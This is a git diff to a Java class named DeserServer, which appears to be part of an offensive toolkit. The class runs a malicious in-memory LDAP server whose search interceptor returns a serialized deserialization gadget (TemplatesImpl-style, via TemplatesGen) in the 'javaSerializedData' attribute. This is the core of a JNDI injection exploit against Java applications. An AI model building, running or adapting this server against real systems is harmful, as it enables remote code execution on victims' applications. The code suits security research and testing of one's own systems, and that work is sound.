@@ -1,27 +1,25 @@
 package LDAP;
 
-import com.unboundid.util.Base64;
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 import com.unboundid.ldap.sdk.Entry;
-import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import tools.PayloadGen;
 import tools.ReflectTools;
+import tools.TemplatesGen;
 
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
 import java.net.InetAddress;
-import java.net.MalformedURLException;
 import java.net.URL;
 import java.text.ParseException;
 
-public class deserServer {
+public class DeserServer {
 
     private static final String LDAP_BASE = "dc=example,dc=com";
 
@@ -97,11 +95,7 @@ public class deserServer {
 //            e.addAttribute("javaFactory", this.codebase.getRef());  
 
             // Payload2: 返回序列化Gadget
-            try {
-                e.addAttribute("javaSerializedData", ReflectTools.ser2bytes(PayloadGen.getPayload()));
-            } catch (ParseException exception) {
-                exception.printStackTrace();
-            }
+            e.addAttribute("javaSerializedData", ReflectTools.ser2bytes(TemplatesGen.getTemplates("aaa".getBytes(), null)));
 
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
